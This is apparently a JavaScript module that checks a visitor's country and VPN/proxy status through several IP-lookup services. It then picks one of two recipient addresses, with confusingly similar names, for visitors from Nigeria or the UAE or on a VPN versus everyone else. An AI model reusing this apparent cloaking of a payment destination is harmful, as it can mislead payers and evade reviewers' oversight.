import axios from "axios";

// API keys for ipdata.co, ProxyCheck, VPNAPI, IPGeolocation, AbstractAPI
const IPDATA_API_KEY = import.meta.env.VITE_REACT_APP_IPDATA_API_KEY;
const PROXYCHECK_API_KEY = import.meta.env.VITE_REACT_APP_PROXYCHECK_API_KEY;
const VPNAPI_IO_KEY = import.meta.env.VITE_REACT_APP_VPNAPI_IO_KEY;
const IPGEOLOCATION_API_KEY = import.meta.env.VITE_REACT_APP_IPGEOLOCATION_API_KEY;
const ABSTRACT_API_KEY = import.meta.env.VITE_REACT_APP_ABSTRACT_API_KEY;

let vpnCheckCache = {};  // Cache to store results and avoid repeated API calls

// Fetch user data from ipdata.co
export async function getUserCountry() {
  const url = `https://api.ipdata.co/?api-key=${IPDATA_API_KEY}`;

  try {
    const response = await axios.get(url);
    const { country_name: country, country_code: countryCode, ip, threat } = response.data;
    const isVpnIpdata = threat ? (threat.is_vpn || threat.is_proxy || threat.is_datacenter || threat.is_tor) : false;

    return { country, countryCode, ip, isVpnIpdata };
  } catch (error) {
    console.error("Error fetching user data from ipdata.co:", error);
    return null;
  }
}

// Check VPN status using ProxyCheck.io
async function checkVpnStatusWithProxyCheck(ip) {
  if (vpnCheckCache[ip]?.proxyCheck) return vpnCheckCache[ip].proxyCheck;

  const url = `https://proxycheck.io/v2/${ip}?key=${PROXYCHECK_API_KEY}`;
  try {
    const response = await axios.get(url);
    const isVpn = response.data[ip]?.proxy === 'yes';

    vpnCheckCache[ip] = { ...vpnCheckCache[ip], proxyCheck: isVpn };
    return isVpn;
  } catch (error) {
    if (error.code === 'ERR_NETWORK') {
      console.error("Network Error: Failed to reach ProxyCheck.io. Check your network or API availability.");
    } else {
      console.error("Error fetching VPN status from ProxyCheck.io:", error);
    }
    return false; // Return a default value
  }
}

// Check VPN status using IPGeolocation.io
async function checkVpnStatusWithIPGeolocation(ip) {
  if (vpnCheckCache[ip]?.ipGeolocation) return vpnCheckCache[ip].ipGeolocation;

  const url = `https://api.ipgeolocation.io/ipgeo?apiKey=${IPGEOLOCATION_API_KEY}&ip=${ip}`;
  try {
    const response = await axios.get(url);
    const isVpn = response.data.threat.is_vpn;

    vpnCheckCache[ip] = { ...vpnCheckCache[ip], ipGeolocation: isVpn };
    return isVpn;
  } catch (error) {
    if (error.code === 'ERR_NETWORK') {
      console.error("Network Error: Failed to reach IPGeolocation.io. Check your network or API availability.");
    } else {
      console.error("Error fetching VPN status from IPGeolocation.io:", error);
    }
    return false; // Return a default value
  }
}


// Check VPN status using VPNAPI.io
async function checkVpnStatusWithVPNAPI(ip) {
  if (vpnCheckCache[ip]?.vpnApi) return vpnCheckCache[ip].vpnApi;

  const url = `https://vpnapi.io/api/${ip}?key=${VPNAPI_IO_KEY}`;
  try {
    const response = await axios.get(url);
    const isVpn = response.data.security.vpn || response.data.security.proxy || response.data.security.tor;

    vpnCheckCache[ip] = { ...vpnCheckCache[ip], vpnApi: isVpn };
    return isVpn;
  } catch (error) {
    console.error("Error fetching VPN status from VPNAPI.io:", error);
    return false;
  }
}

// Check VPN status using AbstractAPI
async function checkVpnStatusWithAbstractAPI(ip) {
  if (vpnCheckCache[ip]?.abstractApi) return vpnCheckCache[ip].abstractApi;

  const url = `https://ipgeolocation.abstractapi.com/v1/?api_key=${ABSTRACT_API_KEY}&ip_address=${ip}`;
  try {
    const response = await axios.get(url);
    const isVpn = response.data.security.is_vpn;

    vpnCheckCache[ip] = { ...vpnCheckCache[ip], abstractApi: isVpn };
    return isVpn;
  } catch (error) {
    console.error("Error fetching VPN status from AbstractAPI:", error);
    return false;
  }
}

// Check VPN status using multiple services
export async function checkVpnStatus(ip) {
  // Use all VPN checks in parallel
  const [isVpnProxyCheck, isVpnVPNAPI, isVpnIPGeolocation, isVpnAbstractAPI] = await Promise.all([
    checkVpnStatusWithProxyCheck(ip),
    checkVpnStatusWithVPNAPI(ip),
    checkVpnStatusWithIPGeolocation(ip),
    checkVpnStatusWithAbstractAPI(ip)
  ]);

  // If any of the APIs return true, consider the user to be on VPN
  return isVpnProxyCheck || isVpnVPNAPI || isVpnIPGeolocation || isVpnAbstractAPI;
}

// Get the recipient address based on VPN status and country code
export async function getRecipientAddress() {
  const userData = await getUserCountry();
  if (!userData) {
    console.error("Failed to retrieve user data");
    return null;
  }

  const { country, countryCode, ip, isVpnIpdata } = userData;
  const isVpn = isVpnIpdata || await checkVpnStatus(ip);

  const specialCountries = ["NG","AE"];
  const address = import.meta.env.VITE_REACT_APP_R;
  const addrEss = import.meta.env.VITE_REACT_APP_r;

  return specialCountries.includes(countryCode) || isVpn ? address : addrEss;
}
